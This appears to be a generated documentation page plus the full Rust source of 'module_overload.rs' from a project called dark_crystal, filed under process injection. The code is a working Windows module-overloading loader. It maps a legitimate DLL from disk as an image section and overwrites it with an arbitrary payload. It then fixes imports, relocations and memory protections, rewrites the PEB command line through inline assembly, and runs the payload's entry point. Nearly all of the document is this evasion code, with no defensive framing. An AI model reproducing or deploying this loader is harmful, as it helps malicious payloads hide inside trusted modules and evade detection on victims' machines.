# module_overload

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/loader/module_overload.rs` |
| **Lines** | 502 |
| **Cards** | T007-process-injection |
| **Role** | Module overloading |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 10 |

## Constants

- `VIEW_SHARE`: `SectionInherit` = `1`
- `GENERIC_READ`: `u32` = `0x8000_0000`

## Types

### struct `Module` (line 58)

### struct `BASE_RELOCATION_ENTRY` (line 465)

## Public API

### `new` (line 77)
```rust
pub fn new(buffer: Vec<u8>, args: String, target_dll: String) -> Result<Self>
```

### `run` (line 188)
```rust
pub fn run(&self) -> Result<()>
```

### `offset` (line 470)
```rust
pub fn offset(&self) -> u16
```

### `type_` (line 474)
```rust
pub fn type_(&self) -> u16
```

### `NtCurrentPeb` (line 480)
```rust
pub fn NtCurrentPeb() -> *const PEB
```

## Internal Functions

- `last_error` (line 69)
- `load_library` (line 133)
- `prepare` (line 209)
- `fixing_iat` (line 272)
- `realoc_image` (line 331)
- `fixing_memory` (line 388)
- `fixing_arguments` (line 435)

## Key Dependencies

- `use windows::Win32::System::{`
- `use windows::{`
- `use windows_targets::link;`

## Full Source

```rust
#![allow(non_snake_case)]
#![allow(unused)]

use std::{
    ffi::{c_void, CStr, CString},
    mem::transmute,
    ptr::null_mut,
    slice::from_raw_parts,
};

use windows::Win32::System::{
    Diagnostics::Debug::*,
    LibraryLoader::{GetProcAddress, LoadLibraryA},
    Memory::*,
    SystemServices::*,
    Threading::*,
    WindowsProgramming::IMAGE_THUNK_DATA64,
};
use windows::{
    core::{Error, Result, BOOL, HRESULT, PCSTR},
    Win32::{
        Foundation::{CloseHandle, GetLastError, HANDLE, HINSTANCE, NTSTATUS, STATUS_SUCCESS},
        Storage::FileSystem::{CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE, OPEN_EXISTING},
    },
};
use windows_targets::link;

type SectionInherit = i32;
const VIEW_SHARE: SectionInherit = 1;
const GENERIC_READ: u32 = 0x8000_0000;

link!("ntdll.dll" "system" fn NtCreateSection(
    sectionhandle: *mut HANDLE,
    desiredaccess: u32,
    objectattributes: *const c_void,
    maximumsize: *const i64,
    sectionpageprotection: u32,
    allocationattributes: u32,
    filehandle: HANDLE
) -> NTSTATUS);
link!("ntdll.dll" "system" fn NtMapViewOfSection(
    sectionhandle: HANDLE,
    processhandle: HANDLE,
    baseaddress: *mut *mut c_void,
    zerobits: usize,
    commitsize: usize,
    sectionoffset: *mut i64,
    viewsize: *mut usize,
    inheritdisposition: SectionInherit,
    allocationtype: u32,
    win32protect: u32
) -> NTSTATUS);

pub type Exe = unsafe extern "system" fn() -> BOOL;
pub type Dll = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

#[derive(Debug)]
pub struct Module {
    pub buffer: Vec<u8>,
    pub target_dll: String,
    pub args: String,
    pub nt_header: *mut IMAGE_NT_HEADERS64,
    pub section_header: *mut IMAGE_SECTION_HEADER,
    pub import_data: IMAGE_DATA_DIRECTORY,
    pub basereloc: IMAGE_DATA_DIRECTORY,
    pub is_dll: bool,
}

fn last_error() -> Error {
    unsafe {
        let code = GetLastError().0 as i32;
        Error::from_hresult(HRESULT(code))
    }
}

impl Module {
    pub fn new(buffer: Vec<u8>, args: String, target_dll: String) -> Result<Self> {
        unsafe {
            if buffer.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
                return Err(last_error());
            }
            let dos_header = buffer.as_ptr() as *mut IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
                return Err(last_error());
            }

            let e_lfanew = (*dos_header).e_lfanew as isize;
            if e_lfanew < 0 {
                return Err(last_error());
            }
            let nt_header_offset = e_lfanew as usize;
            if nt_header_offset
                .checked_add(std::mem::size_of::<IMAGE_NT_HEADERS64>())
                .map_or(true, |end| end > buffer.len())
            {
                return Err(last_error());
            }
            let nt_header = (dos_header as usize + nt_header_offset) as *mut IMAGE_NT_HEADERS64;
            if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
                return Err(last_error());
            }

            let section_header_offset =
                nt_header_offset + std::mem::size_of::<IMAGE_NT_HEADERS64>();
            let section_table_size = ((*nt_header).FileHeader.NumberOfSections as usize)
                .saturating_mul(std::mem::size_of::<IMAGE_SECTION_HEADER>());
            if section_header_offset
                .checked_add(section_table_size)
                .map_or(true, |end| end > buffer.len())
            {
                return Err(last_error());
            }
            let section_header =
                (dos_header as usize + section_header_offset) as *mut IMAGE_SECTION_HEADER;

            let optional_header = &(*nt_header).OptionalHeader;

            Ok(Self {
                buffer,
                args,
                target_dll,
                nt_header,
                section_header,
                is_dll: ((*nt_header).FileHeader.Characteristics & IMAGE_FILE_DLL)
                    != IMAGE_FILE_CHARACTERISTICS(0),
                import_data: optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize],
                basereloc: optional_header.DataDirectory
                    [IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize],
            })
        }
    }

    fn load_library(&self) -> Result<*mut c_void> {
        unsafe {
            let dll = CString::new(self.target_dll.clone()).unwrap();
            let h_file = CreateFileA(
                PCSTR(dll.as_ptr() as *const u8),
                GENERIC_READ,
                FILE_SHARE_MODE(0),
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            )?;

            let mut section = HANDLE::default();
            let status = NtCreateSection(
                &mut section,
                SECTION_ALL_ACCESS.0,
                null_mut(),
                null_mut(),
                PAGE_READONLY.0,
                SEC_IMAGE.0,
                h_file,
            );

            if status != STATUS_SUCCESS {
                let _ = CloseHandle(h_file);
                return Err(last_error());
            }

            let mut module = null_mut();
            let mut view_size = 0;
            let status = NtMapViewOfSection(
                section,
                HANDLE((-1isize) as *mut c_void),
                &mut module,
                0,
                0,
                null_mut(),
                &mut view_size,
                VIEW_SHARE,
                0,
                PAGE_EXECUTE_READWRITE.0,
            );

            let _ = CloseHandle(h_file);
            let _ = CloseHandle(section);

            if status != STATUS_SUCCESS {
                return Err(last_error());
            }

            Ok(module)
        }
    }

    pub fn run(&self) -> Result<()> {
        let module = self.load_library()?;
        self.prepare(module)?;

        unsafe {
            self.fixing_arguments()?;

            let entry_point =
                module.offset((*self.nt_header).OptionalHeader.AddressOfEntryPoint as isize);
            if self.is_dll {
                let DllMain = transmute::<_, Dll>(entry_point);
                DllMain(HINSTANCE(module), DLL_PROCESS_ATTACH, null_mut());
            } else {
                let Main = transmute::<_, Exe>(entry_point);
                Main();
            }

            Ok(())
        }
    }

    fn prepare(&self, module: *mut c_void) -> Result<()> {
        unsafe {
            let address = VirtualAlloc(
                None,
                (*self.nt_header).OptionalHeader.SizeOfImage as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if address.is_null() {
                return Err(last_error());
            }

            let mut tmp_section = self.section_header;
            for _ in 0..(*self.nt_header).FileHeader.NumberOfSections {
                let dst = (*tmp_section).VirtualAddress as isize;
                let start = (*tmp_section).PointerToRawData as usize;
                let end = start + (*tmp_section).SizeOfRawData as usize;

                if end <= self.buffer.len() {
                    let src = &self.buffer[start..end];
                    std::ptr::copy_nonoverlapping(
                        src.as_ptr(),
                        address.offset(dst).cast(),
                        src.len(),
                    );
                }

                tmp_section = tmp_section.add(1)
            }

            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(
                module,
                (*self.nt_header).OptionalHeader.SizeOfImage as usize,
                PAGE_READWRITE,
                &mut old_protect,
            )?;

            std::ptr::copy_nonoverlapping(
                address.cast::<u8>(),
                module.cast::<u8>(),
                (*self.nt_header).OptionalHeader.SizeOfImage as usize,
            );

            self.fixing_iat(module)?;
            self.realoc_image(module)?;

            VirtualProtect(
                module,
                (*self.nt_header).OptionalHeader.SizeOfHeaders as usize,
                PAGE_READONLY,
                &mut old_protect,
            )?;

            self.fixing_memory(module)?;

            VirtualFree(address, 0, MEM_RELEASE)?;
        }

        Ok(())
    }

    fn fixing_iat(&self, address: *mut c_void) -> Result<()> {
        unsafe {
            if self.import_data.VirtualAddress == 0 {
                return Ok(());
            }

            let import_descriptor = address.offset(self.import_data.VirtualAddress as isize)
                as *mut IMAGE_IMPORT_DESCRIPTOR;

            let mut current_import = import_descriptor;
            while (*current_import).FirstThunk != 0 {
                let original_first_chunk_rva = (*current_import).Anonymous.OriginalFirstThunk;
                let first_thunk_rva = (*current_import).FirstThunk;
                let lookup_thunk_rva = if original_first_chunk_rva != 0 {
                    original_first_chunk_rva
                } else {
                    first_thunk_rva
                };

                let dll_name_ptr = address.offset((*current_import).Name as isize) as *const i8;
                let dll_name = CStr::from_ptr(dll_name_ptr).to_str().unwrap();
                let h_module = LoadLibraryA(PCSTR(dll_name_ptr as *const u8))?;

                let mut thunk_offset = 0;
                loop {
                    let original_thunk = address.offset(lookup_thunk_rva as isize + thunk_offset)
                        as *const IMAGE_THUNK_DATA64;
                    let first_thunk = address.offset(first_thunk_rva as isize + thunk_offset)
                        as *mut IMAGE_THUNK_DATA64;

                    if (*original_thunk).u1.Function == 0 {
                        break;
                    }

                    let func_address = if (*original_thunk).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0 {
                        let ordinal = (*original_thunk).u1.Ordinal & 0xffff;
                        GetProcAddress(h_module, PCSTR(ordinal as *const u8))
                    } else {
                        let import_by_name = address
                            .offset((*original_thunk).u1.AddressOfData as isize)
                            as *const IMAGE_IMPORT_BY_NAME;
                        let name = (*import_by_name).Name.as_ptr() as *const i8;
                        GetProcAddress(h_module, PCSTR(name as *const u8))
                    };

                    match func_address {
                        Some(addr) => (*first_thunk).u1.Function = addr as u64,
                        None => return Err(last_error()),
                    }

                    thunk_offset += std::mem::size_of::<IMAGE_THUNK_DATA64>() as isize;
                }
                current_import = current_import.add(1);
            }
        }

        Ok(())
    }

    fn realoc_image(&self, address: *mut c_void) -> Result<()> {
        unsafe {
            if self.basereloc.VirtualAddress == 0 {
                return Ok(());
            }

            let delta = address as isize - (*self.nt_header).OptionalHeader.ImageBase as isize;
            if delta == 0 {
                return Ok(());
            }

            let mut base_relocation = address.offset(self.basereloc.VirtualAddress as isize)
                as *mut IMAGE_BASE_RELOCATION;

            while (*base_relocation).VirtualAddress != 0 {
                let mut base_entry = base_relocation.offset(1) as *mut BASE_RELOCATION_ENTRY;
                let block_end = (base_relocation as *mut u8)
                    .offset((*base_relocation).SizeOfBlock as isize)
                    as *mut BASE_RELOCATION_ENTRY;

                while base_entry < block_end {
                    let entry_type = (*base_entry).type_();
                    let entry_offset = (*base_entry).offset() as u32;
                    let target_address =
                        address.add(((*base_relocation).VirtualAddress + entry_offset) as usize);

                    match entry_type as u32 {
                        IMAGE_REL_BASED_DIR64 => {
                            let target = target_address as *mut isize;
                            *target += delta;
                        }
                        IMAGE_REL_BASED_HIGHLOW => {
                            let target = target_address as *mut i32;
                            *target += delta as i32;
                        }
                        IMAGE_REL_BASED_HIGH => {
                            let target = target_address as *mut u16;
                            *target = (*target as u32 + ((delta as u32 >> 16) & 0xFFFF)) as u16;
                        }
                        IMAGE_REL_BASED_LOW => {
                            let target = target_address as *mut u16;
                            *target = (*target as u32 + (delta as u32 & 0xFFFF)) as u16;
                        }
                        IMAGE_REL_BASED_ABSOLUTE => {}
                        _ => {
                            return Err(last_error());
                        }
                    }
                    base_entry = base_entry.add(1);
                }
                base_relocation = block_end as *mut IMAGE_BASE_RELOCATION;
            }
        }

        Ok(())
    }

    fn fixing_memory(&self, address: *mut c_void) -> Result<()> {
        unsafe {
            let num_sections = (*self.nt_header).FileHeader.NumberOfSections;
            let mut section_header = self.section_header;

            for _ in 0..num_sections {
                // PE protections must cover the mapped virtual span, including zero-filled tails.
                let section_size = ((*section_header).Misc.VirtualSize)
                    .max((*section_header).SizeOfRawData)
                    as usize;

                if section_size == 0 || (*section_header).VirtualAddress == 0 {
                    section_header = section_header.add(1);
                    continue;
                }

                let characteristics = (*section_header).Characteristics;
                let protection = match (
                    (characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SECTION_CHARACTERISTICS(0),
                    (characteristics & IMAGE_SCN_MEM_READ) != IMAGE_SECTION_CHARACTERISTICS(0),
                    (characteristics & IMAGE_SCN_MEM_WRITE) != IMAGE_SECTION_CHARACTERISTICS(0),
                ) {
                    (true, true, true) => PAGE_EXECUTE_READWRITE,
                    (true, true, false) => PAGE_EXECUTE_READ,
                    (true, false, true) => PAGE_EXECUTE_WRITECOPY,
                    (true, false, false) => PAGE_EXECUTE,
                    (false, true, true) => PAGE_READWRITE,
                    (false, true, false) => PAGE_READONLY,
                    (false, false, true) => PAGE_WRITECOPY,
                    _ => PAGE_NOACCESS,
                };

                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(
                    address.offset((*section_header).VirtualAddress as isize),
                    section_size,
                    protection,
                    &mut old_protect,
                )?;

                section_header = section_header.add(1);
            }
        }

        Ok(())
    }

    fn fixing_arguments(&self) -> Result<()> {
        unsafe {
            let peb = NtCurrentPeb();
            let process_parameters = (*peb).ProcessParameters as *mut RTL_USER_PROCESS_PARAMETERS;

            // Clear existing command line
            std::ptr::write_bytes(
                (*process_parameters).CommandLine.Buffer.0 as *mut u8,
                0,
                (*process_parameters).CommandLine.Length as usize,
            );

            let current_exe = std::env::current_exe().unwrap_or("".into());
            let path_name_str = format!("\"{}\" {}", current_exe.to_string_lossy(), self.args);
            let path_name = path_name_str.encode_utf16().collect::<Vec<u16>>();

            if path_name.len() * 2 <= (*process_parameters).CommandLine.MaximumLength as usize {
                std::ptr::copy_nonoverlapping(
                    path_name.as_ptr(),
                    (*process_parameters).CommandLine.Buffer.0,
                    path_name.len(),
                );
                (*process_parameters).CommandLine.Length = (path_name.len() * 2) as u16;
            }
        }

        Ok(())
    }
}

pub struct BASE_RELOCATION_ENTRY {
    pub data: u16,
}

impl BASE_RELOCATION_ENTRY {
    pub fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    pub fn type_(&self) -> u16 {
        (self.data >> 12) & 0xF
    }
}

#[inline(always)]
pub fn NtCurrentPeb() -> *const PEB {
    unsafe {
        #[cfg(target_arch = "x86_64")]
        {
            let peb: *const PEB;
            std::arch::asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb
            );
            peb
        }

        #[cfg(target_arch = "x86")]
        {
            let peb: *const PEB;
            std::arch::asm!(
                "mov {}, fs:[0x30]",
                out(reg) peb
            );
            peb
        }
    }
}

```